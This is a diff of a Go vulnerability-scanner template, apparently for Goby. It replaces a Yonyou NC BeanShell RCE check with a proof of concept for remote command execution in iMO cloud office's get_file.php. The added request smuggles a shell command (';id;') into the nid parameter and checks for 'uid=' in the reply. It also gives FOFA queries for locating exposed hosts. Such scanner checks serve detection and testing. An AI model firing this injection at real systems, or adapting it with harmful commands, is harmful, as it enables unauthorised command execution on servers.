@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "imo 云办公室 get_file.php 远程命令执行漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"iMO-云办公室\" || product=\"iMO-云办公室\"",
+  "GobyQuery": "app=\"iMO-云办公室\" || product=\"iMO-云办公室\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/file/NDisk/get_file.php?cid=1&nid=;id;",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "uid=",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "imo 云办公室 get_file.php 远程命令执行漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "imo get_file rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
